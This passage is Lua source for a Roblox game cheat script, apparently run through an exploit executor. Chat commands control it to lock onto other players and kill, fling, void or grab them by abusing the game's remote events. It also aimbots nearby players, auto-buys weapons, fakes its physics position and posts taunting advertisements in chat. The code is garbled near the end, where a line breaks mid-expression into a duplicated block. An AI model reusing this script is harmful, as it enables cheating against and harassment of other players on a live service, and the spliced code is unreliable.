                    summonMode = "middle"
                end
            elseif msgLower:match("^%.fling%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.fling%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleFlingCommand(inputName)
                    end
                end
            elseif msgLower:match(".akill on") then
                killall = true
                summonTarget = nil
            elseif msgLower:match(".akill off") then
                killall = false
            elseif msgLower:match("^%.lk%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.lk%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleOPKillCommand(inputName)
                    end
                end
            elseif msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleStompCommand(inputName, botName)
                    end
                end
            elseif msgLower:match("^%.s%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.s%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleStompCommand(inputName)
                    end
                end
            elseif msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleBringCommand(inputName, botName, plr.Name)
                    end
                end
            elseif msgLower:match("^%.b%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.b%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleBringCommand(inputName, nil, plr.Name)
                    end
                end
            elseif msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$") then
                local inputName, botName = msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleDownCommand(inputName, botName)
                    end
                end
            elseif msgLower:match("^%.d%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.d%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleDownCommand(inputName)
                    end
                end
            elseif msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$") then
                local targetName, destinationName = msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$")
                local target = findTargetByName(targetName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleTakeCommand(targetName, destinationName)
                    end
                end
            elseif msgLower:match("^%.tp%s+([^%s]+)$") then
                local locationName = msgLower:match("^%.tp%s+([^%s]+)$")
                handleGotoCommand(plr.Name, locationName)
            elseif msgLower:match("^%.sky%s+([^%s]+)$") then
                local inputName = msgLower:match("^%.sky%s+([^%s]+)$")
                local target = findTargetByName(inputName)
                if target then
                    if isProtected(target) then
                        sendMessage("Cannot target user " .. target.Name .. " because they are premium.")
                    else
                        handleSkyCommand(target.Name)
                    end
                end
            elseif msgLower:match("^%.wl%s+(.+)$") then
                if plr.Name ~= getgenv().Owner then return end
                local input = msgLower:match("^%.wl%s+(.+)$")
                local target = findTargetByName(input)
                if target then
                    whitelistedUsers[target.Name] = true
                    setupChatListener(target)
                end
            elseif msgLower:match("^%.unwl%s+(.+)$") then
                if plr.Name ~= getgenv().Owner then return end
                local input = msgLower:match("^%.unwl%s+(.+)$")
                local target = findTargetByName(input)
                if target then
                    whitelistedUsers[target.Name] = nil
                    activeListeners[target.UserId] = nil
                end
            end
        end
    end
end

TextChatService.OnIncomingMessage = function(msg)
    for _, handler in pairs(activeListeners) do
        handler(msg)
    end
end

for _, plr in pairs(Players:GetPlayers()) do
    if isAuthorized(plr) or isPremium(plr) or isBypassPremium(plr) then
        if isAuthorized(plr) then
            whitelistedUsers[plr.Name] = true
        end
        setupChatListener(plr)
        setupDisplayNameListener(plr)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if isAuthorized(plr) or isPremium(plr) or isBypassPremium(plr) then
        setupChatListener(plr)
        if isPremium(plr) or isBypassPremium(plr) then
            setupDisplayNameListener(plr)
        end
    end
end)

local lockedTargetUserId = nil
local autoLocked = false
local canrun = true

task.spawn(function()
    while true do
        if voiding and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            if root then
                root.CFrame = CFrame.new(
                    math.random(-999999, 999999),
                    math.random(0, 999999),
                    math.random(-999999, 999999)
                )
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if not lockedTarget and lockedTargetUserId and not autoLocked then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.UserId == lockedTargetUserId then
                    lockedTarget = plr
                    autoLocked = true
                    break
                end
            end
        end
        if lockedTarget then
            local targetCharacter = lockedTarget.Character
            if targetCharacter then
                local bodyEffects = targetCharacter:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                if isKO and trashtalkactive then
                    if not hasSentKOMessage then
                        sendMessage("Get SANDY g g / fJeSNdJr4D")
                        sendMessage("HAHAHA NOOB")
                        sendMessage("SANDY dominated YOU!")
                        hasSentKOMessage = true
                    end
                else
                    hasSentKOMessage = false
                end
            end
            if not lockedTarget:IsDescendantOf(game) then
                lockedTargetUserId = lockedTarget.UserId
                lockedTarget = nil
                autoLocked = false
                voiding = true
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if teleporting and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetCharacter
            if lockedTarget and lockedTarget.Character then
                targetCharacter = lockedTarget.Character
            elseif sentrytarget and sentrytarget.Character then
                targetCharacter = sentrytarget.Character
            end
            if targetCharacter and Character then
                local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
                local playerHRP = Character:FindFirstChild("HumanoidRootPart")
                if targetHRP and playerHRP then
                    playerHRP.CFrame = CFrame.lookAt(
                        targetHRP.Position + Vector3.new(math.random(-20, 20), math.random(-20, 20), math.random(-20, 20)),
                        targetHRP.Position
                    )
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if lockedTarget and not stomponly and not bringonly and not takeonly and not getgenv().downonly and not opkill and not flingonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetChar = lockedTarget.Character
            local myChar = Character
            if targetChar and myChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local myBodyEffects = myChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isNil = not targetChar:FindFirstChild("UpperTorso") or not targetChar:FindFirstChild("Head")
                local hasForceField = targetChar:FindFirstChildOfClass("ForceField")
                local isReloading = myBodyEffects and myBodyEffects:FindFirstChild("Reload") and myBodyEffects["Reload"].Value
                local myHasForceField = myChar:FindFirstChildOfClass("ForceField")
                local isGrabbed = isPlayerGrabbed(targetChar)
                if AbuseProtection and not myHasForceField and not isReloading and not refreshingfakeposition then
                    local myHum = myChar:FindFirstChild("Humanoid")
                    if myHum then
                        canrun = false
                        voiding = true
                        teleporting = false
                        task.wait(0.1)
                        myHum.Health = 0
                        task.wait(0.1)
                        canrun = true
                    end
                end
                if (isSDeath or isNil) and not isReloading and canrun then
                    teleporting = false
                    voiding = true
                    reloadTool()
                    shouldSwitch = true
                    if not didRefreshOnDeath and fpactive then
                        didRefreshOnDeath = true
                        task.delay(0.2, function()
                            refreshingfakeposition = true
                            setfflag("S2PhysicsSenderRate", 0)
                            setfpscap(4)
                            task.wait(0.1)
                            setfflag("S2PhysicsSenderRate", 20000000000)
                            setfpscap(240)
                            task.wait(3.65)
                            refreshingfakeposition = false
                        end)
                    end
                elseif isKO and not isSDeath and not isGrabbed and not isNil and not isReloading and canrun and not refreshingfakeposition then
                    voiding = false
                    teleporting = false
                    local upperTorso = targetChar:FindFirstChild("UpperTorso")
                    local myHRP = myChar:FindFirstChild("HumanoidRootPart")
                    if upperTorso and myHRP then
                        myHRP.Velocity = Vector3.zero
                        myHRP.RotVelocity = Vector3.zero
                        myHRP.AssemblyLinearVelocity = Vector3.zero
                        myHRP.AssemblyAngularVelocity = Vector3.zero
                        myHRP.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                        task.wait(0.1)
                    end
                elseif not isKO and not isSDeath and not hasForceField and not isGrabbed and not isNil and not isReloading and canrun and not refreshingfakeposition then
                    teleporting = true
                    voiding = false
                    didRefreshOnDeath = false
                elseif isReloading and not refreshingfakeposition then
                    teleporting = false
                    voiding = true
                elseif hasForceField and not isReloading and not refreshingfakeposition then
                    teleporting = false
                    voiding = true
                    reloadTool()
                end
            end
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if stomponly and not bringonly and not takeonly and not getgenv().downonly and not opkill and lockedTarget and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetChar = lockedTarget.Character
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                if isKO and not isSDeath then
                    teleporting = false
                    voiding = false
                    local upperTorso = targetChar:FindFirstChild("UpperTorso")
                    local myHRP = Character and Character:FindFirstChild("HumanoidRootPart")
                    if upperTorso and myHRP then
                        myHRP.Velocity = Vector3.zero
                        myHRP.RotVelocity = Vector3.zero
                        myHRP.AssemblyLinearVelocity = Vector3.zero
                        myHRP.AssemblyAngularVelocity = Vector3.zero
                        myHRP.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                        task.wait(0.1)
                    end
                elseif isSDeath then
                    lockedTarget = nil
                    teleporting = false
                    voiding = true
                    reloadTool()
                elseif not isKO and not isSDeath then
                    teleporting = true
                    voiding = false
                end
            end
            ReplicatedStorage.MainEvent:FireServer("Stomp")
        end
        task.wait()
    end
end)

local bringconnection = nil

task.spawn(function()
    while true do
        if bringonly and lockedTarget and lockedTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetChar = lockedTarget.Character
            local bodyEffects = targetChar:FindFirstChild("BodyEffects")
            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
            local grabbed = isPlayerGrabbed(targetChar)
            local myHRP = Character and Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = targetChar:FindFirstChild("UpperTorso")
            if bringconnection then
                bringconnection:Disconnect()
                bringconnection = nil
            end
            if not grabbed then
                bringconnection = targetChar.ChildAdded:Connect(function(child)
                    if child.Name == "GRABBING_CONSTRAINT" then
                        grabbed = true
                        lockedTarget = nil
                    end
                end)
            end
            if not grabbed and isKO and myHRP and upperTorso then
                teleporting = false
                voiding = false
                myHRP.Velocity = Vector3.zero
                myHRP.RotVelocity = Vector3.zero
                myHRP.AssemblyLinearVelocity = Vector3.zero
                myHRP.AssemblyAngularVelocity = Vector3.zero
                myHRP.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                teleporting = true
                voiding = false
            end
            if grabbed and lastCommandSender then
                lockedTarget = nil
                teleportToTarget(lastCommandSender)
                task.wait(0.3)
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
                voiding = true
                reloadTool()
                if bringconnection then
                    bringconnection:Disconnect()
                    bringconnection = nil
                end
            end
        end
        task.wait()
    end
end)

local takeconnection = nil

task.spawn(function()
    while true do
        if takeonly and lockedTarget and lockedTarget.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local targetChar = lockedTarget.Character
            local bodyEffects = targetChar:FindFirstChild("BodyEffects")
            local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
            local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
            local grabbed = isPlayerGrabbed(targetChar)
            local myHRP = Character and Character:FindFirstChild("HumanoidRootPart")
            local upperTorso = targetChar:FindFirstChild("UpperTorso")
            if takeconnection then
                takeconnection:Disconnect()
                takeconnection = nil
            end
            if not grabbed then
                takeconnection = targetChar.ChildAdded:Connect(function(child)
                    if child.Name == "GRABBING_CONSTRAINT" then
                        grabbed = true
                        lockedTarget = nil
                    end
                end)
            end
            if not grabbed and isKO and myHRP and upperTorso then
                teleporting = false
                voiding = false
                myHRP.Velocity = Vector3.zero
                myHRP.RotVelocity = Vector3.zero
                myHRP.AssemblyLinearVelocity = Vector3.zero
                myHRP.AssemblyAngularVelocity = Vector3.zero
                myHRP.CFrame = CFrame.new(upperTorso.Position + Vector3.new(0, 3.5, 0))
                ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                task.wait(0.3)
            else
                teleporting = true
                voiding = false
            end
            if grabbed then
                local myHRP = Character and Character:FindFirstChild("HumanoidRootPart")
                if skyTarget and myHRP then
                    lockedTarget = nil
                    myHRP.CFrame = CFrame.new(0, -999999999, 0)
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    voiding = true
                    reloadTool()
                    skyTarget = nil
                end
                if gotoCFrame and gotoPlayer and myHRP then
                    lockedTarget = nil
                    myHRP.CFrame = gotoCFrame
                    task.wait(0.3)
                    ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                    task.wait(0.3)
                    voiding = true
                    reloadTool()
                    gotoPlayer = nil
                    gotoCFrame = nil
                end
                if savedTarget5 and myHRP then
                    local dstChar = savedTarget5.Character
                    if dstChar and dstChar:FindFirstChild("HumanoidRootPart") then
                        lockedTarget = nil
                        teleportToPosition(dstChar.HumanoidRootPart.Position)
                        task.wait(0.3)
                        ReplicatedStorage.MainEvent:FireServer("Grabbing", false)
                        task.wait(0.3)
                        voiding = true
                        reloadTool()
                    end
                    savedTarget5 = nil
                end
                if takeconnection then
                    takeconnection:Disconnect()
                    takeconnection = nil
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if getgenv().downonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not opkill and lockedTarget then
            local targetChar = lockedTarget.Character
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                if not isKO and not isSDeath then
                    teleporting = true
                    voiding = false
                elseif isKO or isSDeath then
                    lockedTarget = nil
                    voiding = true
                    reloadTool()
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if opkill and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not getgenv().downonly and lockedTarget then
            local targetChar = lockedTarget.Character
            if targetChar then
                local bodyEffects = targetChar:FindFirstChild("BodyEffects")
                local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                local isGrabbed = isPlayerGrabbed(targetChar)
                local hasForceField = targetChar:FindFirstChildOfClass("ForceField")
                if not isKO and not isSDeath and not isGrabbed and not hasForceField then
                    teleporting = true
                    voiding = false
                elseif isKO or isSDeath or isGrabbed or hasForceField then
                    voiding = true
                    teleporting = false
                end
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if flingonly and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) and not stomponly and not bringonly and not takeonly and not getgenv().downonly and lockedTarget then
            local myChar = Character
            local targetHRP = lockedTarget.Character and lockedTarget.Character:FindFirstChild("HumanoidRootPart")
            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if myHRP and targetHRP then
                teleporting = true
                voiding = false
                myHRP.CFrame = CFrame.new(targetHRP.Position + Vector3.new(0, 0, math.random(-30, 30)))
            end
        end
        task.wait()
    end
end)

task.spawn(function()
    while true do
        if killall and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local switchTarget = false
            if lockedTarget and lockedTarget.Character then
                local bodyEffects = lockedTarget.Character:FindFirstChild("BodyEffects")
                local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                if isSDeath then
                    switchTarget = true
                end
            else
                switchTarget = true
            end
            if switchTarget then
                local candidates = {}
                for _, plr in pairs(Players:GetPlayers()) do
                    if plr.Name ~= getgenv().Owner and plr ~= LocalPlayer and plr.Character then
                        local bodyEffects = plr.Character:FindFirstChild("BodyEffects")
                        local isSDeath = bodyEffects and bodyEffects:FindFirstChild("SDeath") and bodyEffects["SDeath"].Value
                        local isGrabbed = isPlayerGrabbed(plr.Character)
                        if not isSDeath and not isGrabbed then
                            table.insert(candidates, plr)
                        end
                    end
                end
                if #candidates > 0 then
                    lockedTarget = candidates[math.random(1, #candidates)]
                end
            end
        end
        task.wait()
    end
end)

RunService.Heartbeat:Connect(function()
    local targetCharacter = nil
    local target = nil
    if lockedTarget and lockedTarget.Character then
        targetCharacter = lockedTarget.Character
        target = lockedTarget
    elseif sentrytarget and sentrytarget.Character then
        targetCharacter = sentrytarget.Character
        target = sentrytarget
    end
    if not targetCharacter then return end
    local targetPart = targetCharacter:FindFirstChild("Head")
    local bodyEffects = targetCharacter:FindFirstChild("BodyEffects")
    local isKO = bodyEffects and bodyEffects:FindFirstChild("K.O") and bodyEffects["K.O"].Value
    local isGrabbed = isPlayerGrabbed(targetCharacter)
    local hrp = targetCharacter:FindFirstChild("HumanoidRootPart")
    if isKO or isGrabbed or not hrp or not targetPart then return end
    if flingonly and target then return end
    if target == LocalPlayer then
        lockedTarget = nil
        voiding = true
        return
    end
    local playerChar = Character
    if not playerChar then return end
    for _, tool in ipairs(playerChar:GetChildren()) do
        if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
            ReplicatedStorage.MainEvent:FireServer("ShootGun", tool.Handle, tool.Handle.Position, targetPart.Position, targetPart, Vector3.new(0, 0, 0))
        end
    end
end)

RunService.Heartbeat:Connect(function()
    if not getgenv().enabled then return end
    if not Character then return end
    local myHRP = Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return end
    local tool = Character:FindFirstChildOfClass("Tool")
    if not tool or not tool:FindFirstChild("Handle") then return end
    local koValue = bodyEffects and bodyEffects:FindFirstChild("K.O")
    if koValue and koValue.Value then return end
    local closest = math.huge
    local target = nil
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and not getgenv().whitelist[plr.Name] and not getgenv().protectedwhitelist[plr.Name] and plr.Character then
            local head = plr.Character:FindFirstChild("Head")
            local plrBodyEffects = plr.Character:FindFirstChild("BodyEffects")
            local plrKO = plrBodyEffects and plrBodyEffects:FindFirstChild("K.O")
            local isGrabbed = isPlayerGrabbed(plr.Character)
            local hasForceField = plr.Character:FindFirstChildOfClass("ForceField")
            if head and not isGrabbed and not hasForceField and plrKO and not plrKO.Value then
                local dist = (myHRP.Position - head.Position).Magnitude
                if dist < closest then
                    closest = dist
                    target = plr
                end
            end
        end
    end
    if target and target.Character and target.Character:FindFirstChild("Head") then
        for _, tool in pairs(Character:GetChildren()) do
            if tool:IsA("Tool") and tool:FindFirstChild("Handle") then
                ReplicatedStorage.MainEvent:FireServer("ShootGun", tool.Handle, tool.Handle.Position, target.Character.Head.Position, target.Character.Head, Vector3.new(0, 0, 0))
            end
        end
    end
end)

task.spawn(function()
    while true do
        if getgenv().enabled and targetPlayer and Character and targetPlayer.Character and not (buyingInProgress or buyingGunInProgress or buyingMaskInProgress) then
            local playerHRP = Character:FindFirstChild("HumanoidRootPart")
            local targetHRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if playerHRP and targetHRP then
                playerHRP.Velocity = Vector3.zero
                playerHRP.RotVelocity = Vector3.zero
                playerHRP.AssemblyLinearVelocity = Vector3.zero
                playerHRP.AssemblyAngularVelocity = Vector3.zero
                auraangle = auraangle + auraspeed * RunService.RenderStepped:Wait()
                local x = math.cos(auraangle) * auradistance
                local z = math.sin(auraangle) * auradistance
                local newPos = targetHRP.Position + Vector3.new(x, 0, z)
                playerHRP.CFrame = CFrame.new(newPos, newPos * 2 - targetHRP.Position)
            end
        end
        task.wait()
    end
end)

local fired = false

local function setupFireClickDetector()
    local executor = getexecutorname and getexecutorname() or "Unknown"
    if executor:lower():find("xeno") then
        getgenv().fireclickdetector = function(object)
            if not object then return end
            if not fired then
                fired = true
                game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.E, false, game)
            end
            if Character:FindFirstChildOfClass("Tool") then
                humanoid:UnequipTools()
            end
            local clickDetector = object:FindFirstChild("ClickDetector") or object
            if not clickDetector then return end
            local oldParent = clickDetector.Parent
            local stubPart = Instance.new("Part")
            stubPart.Transparency = 1
            stubPart.Size = Vector3.new(30, 30, 30)
            stubPart.Anchored = true
            stubPart.CanCollide = false
            stubPart.Parent = workspace
            clickDetector.Parent = stubPart
            clickDetector.MaxActivationDistance = math.huge
            local connection = RunService.Heartbeat:Connect(function()
                stubPart.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20)
                game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace.CurrentCamera.CFrame)
            end)
            clickDetector.MouseClick:Once(function()
                connection:Disconnect()
                clickDetector.Parent = oldParent
                stubPart:Destroy()
            end)
            task.delay(3, function()
                if connection then
                    connection:Disconnect()
                end
                clickDetector.Parent = oldParent
                stubPart:Destroy()
            end)
        end
    else
        getgenv().fireclickdetector = function(object)
            if not object then return end
            if fireclickdetector then
                pcall(function()
                    fireclickdetector(object, 100)
                end)
            end
        end
    end
end

setupFireClickDetector()

task.spawn(function()
    while true do
        local itemType, gunInfo = getNextItemToBuy()
        if itemType == "gun" and gunInfo and not buyingGunInProgress then
            local toolName = gunInfo.toolName
            local shopName = gunInfo.shopName
            if hasGun(toolName) then
                task.wait(0.5)
                continue
            end
            local ignored = workspace:FindFirstChild("Ignored")
            local shopFolder = ignored and ignored:FindFirstChild("Shop")
            local shopPart = shopFolder and shopFolder:FindFirstChild(shopName)
            if shopPart and Character and root and humanoid then
                buyingGunInProgress = true
                local clickDetector = shopPart:FindFirstChild("ClickDetector")
                local head = shopPart:FindFirstChild("Head")
                if clickDetector and head then
                    local attempts = 0
                    local maxAttempts = 50
                    while not hasGun(toolName) and attempts < maxAttempts do
                        if not humanoid or humanoid.Health <= 0 then
                            break
                        end
                        if hasGun(toolName) then
                            break
                        end
                        if root then
                            root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
                        end
                        fireclickdetector(clickDetector)
                        attempts = attempts + 1
                        task.wait(0.1)
                    end
                end
                buyingGunInProgress = false
            end
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        if not automaskenabled then
            task.wait(1)
            continue
        end
        if not Character then
            task.wait(0.5)
            continue
        end
        local hasMask = Character:FindFirstChild("[Mask]") 
            or Character:FindFirstChild("In-gameMask") 
            or LocalPlayer.Backpack:FindFirstChild("[Mask]")
        if hasMask then
            task.wait(1)
            continue
        end
        if buyingMaskInProgress then
            task.wait(0.5)
            continue
        end
        local ignored = workspace:FindFirstChild("Ignored")
        local shopFolder = ignored and ignored:FindFirstChild("Shop")
        if not shopFolder then
            task.wait(0.5)
            continue
        end
        local maskName = math.random(1, 2) == 1 and "[Skull Mask] - $66" or "[Riot Mask] - $66"
        local maskItem = shopFolder:FindFirstChild(maskName)
        if not maskItem then
            task.wait(0.5)
            continue
        end
        local clickDetector = maskItem:FindFirstChild("ClickDetector")
        local head = maskItem:FindFirstChild("Head")
        if not clickDetector or not head then
            task.wait(0.5)
            continue
        end
        buyingMaskInProgress = true
        local buyAttempts = 0
        while automaskenabled and buyAttempts < 50 do
            hasMask = Character:FindFirstChild("[Mask]") 
                or Character:FindFirstChild("In-gameMask") 
                or LocalPlayer.Backpack:FindFirstChild("[Mask]")
            if hasMask then
                break
            end
            if not humanoid or humanoid.Health <= 0 then
                break
            end
            if root then
                root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
            end
            fireclickdetector(clickDetector)
            buyAttempts = buyAttempts + 1
            task.wait(0.1)
        end
        if hasMask or LocalPlayer.Backpack:FindFirstChild("[Mask]") then
            task.spawn(function()
                local equipAttempts = 0
                while automaskenabled and equipAttempts < 30 do
                    if not Character then break end
                    if Character:FindFirstChild("In-gameMask") then
                        local equippedMask = Character:FindFirstChild("[Mask]")
                        if equippedMask then
                            equippedMask.Parent = LocalPlayer.Backpack
                        end
                        break
                    end
                    local maskTool = LocalPlayer.Backpack:FindFirstChild("[Mask]")
                    if maskTool and humanoid then
                        for _, tool in ipairs(Character:GetChildren()) do
                            if tool:IsA("Tool") and tool.Name ~= "[Mask]" then
                                tool.Parent = LocalPlayer.Backpack
                            end
                        end
                        humanoid:EquipTool(maskTool)
                        task.wait(0.1)
                        maskTool:Activate()
                    end
                    equipAttempts = equipAttempts + 1
                    task.wait(0.2)
                end
                buyingMaskInProgress = false
            end)
        else
            buyingMaskInProgress = false
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        local equippedGuns = getEquippedGuns()
        for _, tool in ipairs(equippedGuns) do
            local gunName = tool.Name
            if not hasGun(gunName) then continue end
            local ammoCount = getAmmoCount(gunName)
            if not ammoCount or ammoCount > 0 then continue end
            if buyingInProgress then
                continue
            end
            local ammoItemName = AmmoMap[gunName]
            if not ammoItemName then continue end
            local ignored = workspace:FindFirstChild("Ignored")
            local shopFolder = ignored and ignored:FindFirstChild("Shop")
            local ammoItem = shopFolder and shopFolder:FindFirstChild(ammoItemName)
            if not ammoItem then continue end
            local clickDetector = ammoItem:FindFirstChild("ClickDetector")
            local head = ammoItem:FindFirstChild("Head")
            if not clickDetector or not head then continue end
            buyingInProgress = true
            if humanoid then
                humanoid:UnequipTools()
            end
            local lastAmmo = getAmmoCount(gunName)
            local purchaseCount = 0
            while purchaseCount < 6 do
                if not humanoid or humanoid.Health <= 0 then
                    break
                end
                if root then
                    root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
                end
                fireclickdetector(clickDetector)
                task.wait(0.15)
                local newAmmo = getAmmoCount(gunName)
                if newAmmo and newAmmo > lastAmmo then
                    lastAmmo = newAmmo
                    purchaseCount = purchaseCount + 1
                end
            end
            reloadTool()
            buyingInProgress = false
        end
        task.wait(0.5)
    end
end)

task.spawn(function()
    while true do
        if not Character or not humanoid or humanoid.Health <=  Character:FindFirstChildOfClass("Tool") then
                humanoid:UnequipTools()
            end
            local clickDetector = object:FindFirstChild("ClickDetector") or object
            if not clickDetector then return end
            local oldParent = clickDetector.Parent
            local stubPart = Instance.new("Part")
            stubPart.Transparency = 1
            stubPart.Size = Vector3.new(30, 30, 30)
            stubPart.Anchored = true
            stubPart.CanCollide = false
            stubPart.Parent = workspace
            clickDetector.Parent = stubPart
            clickDetector.MaxActivationDistance = math.huge
            local connection = RunService.Heartbeat:Connect(function()
                stubPart.CFrame = workspace.Camera.CFrame * CFrame.new(0, 0, -20)
                game:GetService("VirtualUser"):ClickButton1(Vector2.new(20, 20), workspace.CurrentCamera.CFrame)
            end)
            clickDetector.MouseClick:Once(function()
                connection:Disconnect()
                clickDetector.Parent = oldParent
                stubPart:Destroy()
            end)
            task.delay(3, function()
                if connection then
                    connection:Disconnect()
                end
                clickDetector.Parent = oldParent
                stubPart:Destroy()
            end)
        end
    else
        getgenv().fireclickdetector = function(object)
            if not object then return end
            if fireclickdetector then
                pcall(function()
                    fireclickdetector(object, 100)
                end)
            end
        end
    end
end

setupFireClickDetector()

task.spawn(function()
    while true do
        local itemType, gunInfo = getNextItemToBuy()
        if itemType == "gun" and gunInfo and not buyingGunInProgress then
            local toolName = gunInfo.toolName
            local shopName = gunInfo.shopName
            if hasGun(toolName) then
                task.wait(0.5)
                continue
            end
            local ignored = workspace:FindFirstChild("Ignored")
            local shopFolder = ignored and ignored:FindFirstChild("Shop")
            local shopPart = shopFolder and shopFolder:FindFirstChild(shopName)
            if shopPart and Character and root and humanoid then
                buyingGunInProgress = true
                local clickDetector = shopPart:FindFirstChild("ClickDetector")
                local head = shopPart:FindFirstChild("Head")
                if clickDetector and head then
                    local attempts = 0
                    local maxAttempts = 50
                    while not hasGun(toolName) and attempts < maxAttempts do
                        if not humanoid or humanoid.Health <= 0 then
                            break
                        end
                        if hasGun(toolName) then
                            break
                        end
                        if root then
                            root.CFrame = CFrame.new(head.CFrame.Position + Vector3.new(0, -8, 0))
                        end
                        fireclickdetector(clickDetector)
                        attempts = attempts + 1
                        task.wait(0.1)
                    end
                end
